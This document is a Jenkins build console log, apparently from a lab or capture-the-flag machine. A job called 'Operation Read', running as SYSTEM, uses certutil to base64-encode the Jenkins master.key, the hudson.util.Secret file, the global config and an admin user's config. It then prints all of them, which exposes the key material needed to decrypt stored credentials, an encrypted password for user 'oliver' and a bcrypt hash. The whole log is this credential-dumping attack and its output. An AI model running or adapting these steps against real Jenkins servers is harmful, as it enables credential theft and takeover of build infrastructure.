Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read
[Operation Read] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins3678670026792912939.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key C:\Users\Oliver\masterkey.txt  
Input Length = 256
Output Length = 412
CertUtil: -encode command completed successfully.

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml C:\Users\Oliver\config.txt  
Input Length = 2505
Output Length = 3502
CertUtil: -encode command completed successfully.

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret C:\Users\Oliver\hudson.txt  
Input Length = 272
Output Length = 432
CertUtil: -encode command completed successfully.

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c certutil -encode C:\Users\oliver\AppData\Local\Jenkins\.jenkins\Users\admin_17207690984073220035/config.xml C:\Users\Oliver\admin.txt  
Input Length = 3186
Output Length = 4438
CertUtil: -encode command completed successfully.

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c type C:\Users\Oliver\masterkey.txt  
-----BEGIN CERTIFICATE-----
ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3
ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFk
ZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2
ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1
OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5
ZTJiZjBjNzZmZTMxZGIxOQ==
-----END CERTIFICATE-----

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c type l C:\Users\Oliver\config.txt  
The system cannot find the file specified.
Error occurred while processing: l.

C:\Users\Oliver\config.txt


-----BEGIN CERTIFICATE-----
PD94bWwgdmVyc2lvbj0nMS4xJyBlbmNvZGluZz0nVVRGLTgnPz4KPGh1ZHNvbj4K
ICA8ZGlzYWJsZWRBZG1pbmlzdHJhdGl2ZU1vbml0b3JzPgogICAgPHN0cmluZz5q
ZW5raW5zLmRpYWdub3N0aWNzLkNvbnRyb2xsZXJFeGVjdXRvcnNOb0FnZW50czwv
c3RyaW5nPgogICAgPHN0cmluZz5qZW5raW5zLnNlY3VyaXR5LlF1ZXVlSXRlbUF1
dGhlbnRpY2F0b3JNb25pdG9yPC9zdHJpbmc+CiAgICA8c3RyaW5nPmh1ZHNvbi5k
aWFnbm9zaXMuUmV2ZXJzZVByb3h5U2V0dXBNb25pdG9yPC9zdHJpbmc+CiAgPC9k
aXNhYmxlZEFkbWluaXN0cmF0aXZlTW9uaXRvcnM+CiAgPHZlcnNpb24+Mi4zMTc8
L3ZlcnNpb24+CiAgPG51bUV4ZWN1dG9ycz4yPC9udW1FeGVjdXRvcnM+CiAgPG1v
ZGU+Tk9STUFMPC9tb2RlPgogIDx1c2VTZWN1cml0eT50cnVlPC91c2VTZWN1cml0
eT4KICA8YXV0aG9yaXphdGlvblN0cmF0ZWd5IGNsYXNzPSJodWRzb24uc2VjdXJp
dHkuR2xvYmFsTWF0cml4QXV0aG9yaXphdGlvblN0cmF0ZWd5Ij4KICAgIDxwZXJt
aXNzaW9uPmh1ZHNvbi5tb2RlbC5IdWRzb24uQWRtaW5pc3RlcjphZG1pbjwvcGVy
bWlzc2lvbj4KICAgIDxwZXJtaXNzaW9uPmh1ZHNvbi5tb2RlbC5IdWRzb24uUmVh
ZDphdXRoZW50aWNhdGVkPC9wZXJtaXNzaW9uPgogICAgPHBlcm1pc3Npb24+aHVk
c29uLm1vZGVsLkl0ZW0uQ2FuY2VsOmF1dGhlbnRpY2F0ZWQ8L3Blcm1pc3Npb24+
CiAgICA8cGVybWlzc2lvbj5odWRzb24ubW9kZWwuSXRlbS5Db25maWd1cmU6YXV0
aGVudGljYXRlZDwvcGVybWlzc2lvbj4KICAgIDxwZXJtaXNzaW9uPmh1ZHNvbi5t
b2RlbC5JdGVtLkNyZWF0ZTphdXRoZW50aWNhdGVkPC9wZXJtaXNzaW9uPgogICAg
PHBlcm1pc3Npb24+aHVkc29uLm1vZGVsLkl0ZW0uRGVsZXRlOmF1dGhlbnRpY2F0
ZWQ8L3Blcm1pc3Npb24+CiAgICA8cGVybWlzc2lvbj5odWRzb24ubW9kZWwuSXRl
bS5EaXNjb3ZlcjphdXRoZW50aWNhdGVkPC9wZXJtaXNzaW9uPgogICAgPHBlcm1p
c3Npb24+aHVkc29uLm1vZGVsLkl0ZW0uUmVhZDphdXRoZW50aWNhdGVkPC9wZXJt
aXNzaW9uPgogICAgPHBlcm1pc3Npb24+aHVkc29uLm1vZGVsLkl0ZW0uV29ya3Nw
YWNlOmF1dGhlbnRpY2F0ZWQ8L3Blcm1pc3Npb24+CiAgPC9hdXRob3JpemF0aW9u
U3RyYXRlZ3k+CiAgPHNlY3VyaXR5UmVhbG0gY2xhc3M9Imh1ZHNvbi5zZWN1cml0
eS5IdWRzb25Qcml2YXRlU2VjdXJpdHlSZWFsbSI+CiAgICA8ZGlzYWJsZVNpZ251
cD5mYWxzZTwvZGlzYWJsZVNpZ251cD4KICAgIDxlbmFibGVDYXB0Y2hhPmZhbHNl
PC9lbmFibGVDYXB0Y2hhPgogIDwvc2VjdXJpdHlSZWFsbT4KICA8ZGlzYWJsZVJl
bWVtYmVyTWU+ZmFsc2U8L2Rpc2FibGVSZW1lbWJlck1lPgogIDxwcm9qZWN0TmFt
aW5nU3RyYXRlZ3kgY2xhc3M9ImplbmtpbnMubW9kZWwuUHJvamVjdE5hbWluZ1N0
cmF0ZWd5JERlZmF1bHRQcm9qZWN0TmFtaW5nU3RyYXRlZ3kiLz4KICA8d29ya3Nw
YWNlRGlyPiR7SkVOS0lOU19IT01FfS93b3Jrc3BhY2UvJHtJVEVNX0ZVTExfTkFN
RX08L3dvcmtzcGFjZURpcj4KICA8YnVpbGRzRGlyPiR7SVRFTV9ST09URElSfS9i
dWlsZHM8L2J1aWxkc0Rpcj4KICA8bWFya3VwRm9ybWF0dGVyIGNsYXNzPSJodWRz
b24ubWFya3VwLkVzY2FwZWRNYXJrdXBGb3JtYXR0ZXIiLz4KICA8amRrcy8+CiAg
PHZpZXdzVGFiQmFyIGNsYXNzPSJodWRzb24udmlld3MuRGVmYXVsdFZpZXdzVGFi
QmFyIi8+CiAgPG15Vmlld3NUYWJCYXIgY2xhc3M9Imh1ZHNvbi52aWV3cy5EZWZh
dWx0TXlWaWV3c1RhYkJhciIvPgogIDxjbG91ZHMvPgogIDxzY21DaGVja291dFJl
dHJ5Q291bnQ+MDwvc2NtQ2hlY2tvdXRSZXRyeUNvdW50PgogIDx2aWV3cz4KICAg
IDxodWRzb24ubW9kZWwuQWxsVmlldz4KICAgICAgPG93bmVyIGNsYXNzPSJodWRz
b24iIHJlZmVyZW5jZT0iLi4vLi4vLi4iLz4KICAgICAgPG5hbWU+YWxsPC9uYW1l
PgogICAgICA8ZmlsdGVyRXhlY3V0b3JzPmZhbHNlPC9maWx0ZXJFeGVjdXRvcnM+
CiAgICAgIDxmaWx0ZXJRdWV1ZT5mYWxzZTwvZmlsdGVyUXVldWU+CiAgICAgIDxw
cm9wZXJ0aWVzIGNsYXNzPSJodWRzb24ubW9kZWwuVmlldyRQcm9wZXJ0eUxpc3Qi
Lz4KICAgIDwvaHVkc29uLm1vZGVsLkFsbFZpZXc+CiAgPC92aWV3cz4KICA8cHJp
bWFyeVZpZXc+YWxsPC9wcmltYXJ5Vmlldz4KICA8c2xhdmVBZ2VudFBvcnQ+LTE8
L3NsYXZlQWdlbnRQb3J0PgogIDxsYWJlbD48L2xhYmVsPgogIDxjcnVtYklzc3Vl
ciBjbGFzcz0iaHVkc29uLnNlY3VyaXR5LmNzcmYuRGVmYXVsdENydW1iSXNzdWVy
Ij4KICAgIDxleGNsdWRlQ2xpZW50SVBGcm9tQ3J1bWI+ZmFsc2U8L2V4Y2x1ZGVD
bGllbnRJUEZyb21DcnVtYj4KICA8L2NydW1iSXNzdWVyPgogIDxub2RlUHJvcGVy
dGllcy8+CiAgPGdsb2JhbE5vZGVQcm9wZXJ0aWVzLz4KICA8bm9kZVJlbmFtZU1p
Z3JhdGlvbk5lZWRlZD5mYWxzZTwvbm9kZVJlbmFtZU1pZ3JhdGlvbk5lZWRlZD4K
PC9odWRzb24+
-----END CERTIFICATE-----

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c type  C:\Users\Oliver\hudson.txt  
-----BEGIN CERTIFICATE-----
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu
2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO
kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2L
AORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9
GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc
pBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
-----END CERTIFICATE-----

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>cmd /c type  C:\Users\Oliver\admin.txt 
-----BEGIN CERTIFICATE-----
PD94bWwgdmVyc2lvbj0nMS4xJyBlbmNvZGluZz0nVVRGLTgnPz4KPHVzZXI+CiAg
PHZlcnNpb24+MTA8L3ZlcnNpb24+CiAgPGlkPmFkbWluPC9pZD4KICA8ZnVsbE5h
bWU+YWRtaW48L2Z1bGxOYW1lPgogIDxwcm9wZXJ0aWVzPgogICAgPGNvbS5jbG91
ZGJlZXMucGx1Z2lucy5jcmVkZW50aWFscy5Vc2VyQ3JlZGVudGlhbHNQcm92aWRl
cl8tVXNlckNyZWRlbnRpYWxzUHJvcGVydHkgcGx1Z2luPSJjcmVkZW50aWFsc0Ay
LjYuMSI+CiAgICAgIDxkb21haW5DcmVkZW50aWFsc01hcCBjbGFzcz0iaHVkc29u
LnV0aWwuQ29weU9uV3JpdGVNYXAkSGFzaCI+CiAgICAgICAgPGVudHJ5PgogICAg
ICAgICAgPGNvbS5jbG91ZGJlZXMucGx1Z2lucy5jcmVkZW50aWFscy5kb21haW5z
LkRvbWFpbj4KICAgICAgICAgICAgPHNwZWNpZmljYXRpb25zLz4KICAgICAgICAg
IDwvY29tLmNsb3VkYmVlcy5wbHVnaW5zLmNyZWRlbnRpYWxzLmRvbWFpbnMuRG9t
YWluPgogICAgICAgICAgPGphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRl
QXJyYXlMaXN0PgogICAgICAgICAgICA8Y29tLmNsb3VkYmVlcy5wbHVnaW5zLmNy
ZWRlbnRpYWxzLmltcGwuVXNlcm5hbWVQYXNzd29yZENyZWRlbnRpYWxzSW1wbD4K
ICAgICAgICAgICAgICA8aWQ+MzIwYTYwYjktMWU1Yy00Mzk5LThhZmUtNDQ0NjZj
OWNkZTllPC9pZD4KICAgICAgICAgICAgICA8ZGVzY3JpcHRpb24+PC9kZXNjcmlw
dGlvbj4KICAgICAgICAgICAgICA8dXNlcm5hbWU+b2xpdmVyPC91c2VybmFtZT4K
ICAgICAgICAgICAgICA8cGFzc3dvcmQ+e0FRQUFBQkFBQUFBUXFVK20rbUM2Wm5M
YTAreWFhbmoyZUJTYlRrK2g0UDVvbWpLZHdWMTd2Y0E9fTwvcGFzc3dvcmQ+CiAg
ICAgICAgICAgICAgPHVzZXJuYW1lU2VjcmV0PmZhbHNlPC91c2VybmFtZVNlY3Jl
dD4KICAgICAgICAgICAgPC9jb20uY2xvdWRiZWVzLnBsdWdpbnMuY3JlZGVudGlh
bHMuaW1wbC5Vc2VybmFtZVBhc3N3b3JkQ3JlZGVudGlhbHNJbXBsPgogICAgICAg
ICAgPC9qYXZhLnV0aWwuY29uY3VycmVudC5Db3B5T25Xcml0ZUFycmF5TGlzdD4K
ICAgICAgICA8L2VudHJ5PgogICAgICA8L2RvbWFpbkNyZWRlbnRpYWxzTWFwPgog
ICAgPC9jb20uY2xvdWRiZWVzLnBsdWdpbnMuY3JlZGVudGlhbHMuVXNlckNyZWRl
bnRpYWxzUHJvdmlkZXJfLVVzZXJDcmVkZW50aWFsc1Byb3BlcnR5PgogICAgPGh1
ZHNvbi5wbHVnaW5zLmVtYWlsZXh0LndhdGNoaW5nLkVtYWlsRXh0V2F0Y2hBY3Rp
b25fLVVzZXJQcm9wZXJ0eSBwbHVnaW49ImVtYWlsLWV4dEAyLjg0Ij4KICAgICAg
PHRyaWdnZXJzLz4KICAgIDwvaHVkc29uLnBsdWdpbnMuZW1haWxleHQud2F0Y2hp
bmcuRW1haWxFeHRXYXRjaEFjdGlvbl8tVXNlclByb3BlcnR5PgogICAgPGh1ZHNv
bi5tb2RlbC5NeVZpZXdzUHJvcGVydHk+CiAgICAgIDx2aWV3cz4KICAgICAgICA8
aHVkc29uLm1vZGVsLkFsbFZpZXc+CiAgICAgICAgICA8b3duZXIgY2xhc3M9Imh1
ZHNvbi5tb2RlbC5NeVZpZXdzUHJvcGVydHkiIHJlZmVyZW5jZT0iLi4vLi4vLi4i
Lz4KICAgICAgICAgIDxuYW1lPmFsbDwvbmFtZT4KICAgICAgICAgIDxmaWx0ZXJF
eGVjdXRvcnM+ZmFsc2U8L2ZpbHRlckV4ZWN1dG9ycz4KICAgICAgICAgIDxmaWx0
ZXJRdWV1ZT5mYWxzZTwvZmlsdGVyUXVldWU+CiAgICAgICAgICA8cHJvcGVydGll
cyBjbGFzcz0iaHVkc29uLm1vZGVsLlZpZXckUHJvcGVydHlMaXN0Ii8+CiAgICAg
ICAgPC9odWRzb24ubW9kZWwuQWxsVmlldz4KICAgICAgPC92aWV3cz4KICAgIDwv
aHVkc29uLm1vZGVsLk15Vmlld3NQcm9wZXJ0eT4KICAgIDxvcmcuamVua2luc2Np
LnBsdWdpbnMuZGlzcGxheXVybGFwaS51c2VyLlByZWZlcnJlZFByb3ZpZGVyVXNl
clByb3BlcnR5IHBsdWdpbj0iZGlzcGxheS11cmwtYXBpQDIuMy41Ij4KICAgICAg
PHByb3ZpZGVySWQ+ZGVmYXVsdDwvcHJvdmlkZXJJZD4KICAgIDwvb3JnLmplbmtp
bnNjaS5wbHVnaW5zLmRpc3BsYXl1cmxhcGkudXNlci5QcmVmZXJyZWRQcm92aWRl
clVzZXJQcm9wZXJ0eT4KICAgIDxodWRzb24ubW9kZWwuUGFuZVN0YXR1c1Byb3Bl
cnRpZXM+CiAgICAgIDxjb2xsYXBzZWQvPgogICAgPC9odWRzb24ubW9kZWwuUGFu
ZVN0YXR1c1Byb3BlcnRpZXM+CiAgICA8amVua2lucy5zZWN1cml0eS5zZWVkLlVz
ZXJTZWVkUHJvcGVydHk+CiAgICAgIDxzZWVkPmVhNzViNWJkODBlNDc2M2U8L3Nl
ZWQ+CiAgICA8L2plbmtpbnMuc2VjdXJpdHkuc2VlZC5Vc2VyU2VlZFByb3BlcnR5
PgogICAgPGh1ZHNvbi5zZWFyY2guVXNlclNlYXJjaFByb3BlcnR5PgogICAgICA8
aW5zZW5zaXRpdmVTZWFyY2g+dHJ1ZTwvaW5zZW5zaXRpdmVTZWFyY2g+CiAgICA8
L2h1ZHNvbi5zZWFyY2guVXNlclNlYXJjaFByb3BlcnR5PgogICAgPGh1ZHNvbi5t
b2RlbC5UaW1lWm9uZVByb3BlcnR5Lz4KICAgIDxodWRzb24uc2VjdXJpdHkuSHVk
c29uUHJpdmF0ZVNlY3VyaXR5UmVhbG1fLURldGFpbHM+CiAgICAgIDxwYXNzd29y
ZEhhc2g+I2piY3J5cHQ6JDJhJDEwJHExN2FDTnhnY2lRdDhTMjQ2VTRaYXVPY2NP
WTd3bGtEaWg5Yi8wajRJVmpac2RqVU5BUG9XPC9wYXNzd29yZEhhc2g+CiAgICA8
L2h1ZHNvbi5zZWN1cml0eS5IdWRzb25Qcml2YXRlU2VjdXJpdHlSZWFsbV8tRGV0
YWlscz4KICAgIDxodWRzb24udGFza3MuTWFpbGVyXy1Vc2VyUHJvcGVydHkgcGx1
Z2luPSJtYWlsZXJAMS4zNCI+CiAgICAgIDxlbWFpbEFkZHJlc3M+YWRtaW5Ab2Jq
ZWN0LmxvY2FsPC9lbWFpbEFkZHJlc3M+CiAgICA8L2h1ZHNvbi50YXNrcy5NYWls
ZXJfLVVzZXJQcm9wZXJ0eT4KICAgIDxqZW5raW5zLnNlY3VyaXR5LkFwaVRva2Vu
UHJvcGVydHk+CiAgICAgIDx0b2tlblN0b3JlPgogICAgICAgIDx0b2tlbkxpc3Qv
PgogICAgICA8L3Rva2VuU3RvcmU+CiAgICA8L2plbmtpbnMuc2VjdXJpdHkuQXBp
VG9rZW5Qcm9wZXJ0eT4KICAgIDxqZW5raW5zLnNlY3VyaXR5Lkxhc3RHcmFudGVk
QXV0aG9yaXRpZXNQcm9wZXJ0eT4KICAgICAgPHJvbGVzPgogICAgICAgIDxzdHJp
bmc+YXV0aGVudGljYXRlZDwvc3RyaW5nPgogICAgICA8L3JvbGVzPgogICAgICA8
dGltZXN0YW1wPjE2MzQ3OTMzMzIxOTU8L3RpbWVzdGFtcD4KICAgIDwvamVua2lu
cy5zZWN1cml0eS5MYXN0R3JhbnRlZEF1dGhvcml0aWVzUHJvcGVydHk+CiAgPC9w
cm9wZXJ0aWVzPgo8L3VzZXI+
-----END CERTIFICATE-----

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Operation Read>exit 0 
Finished: SUCCESS
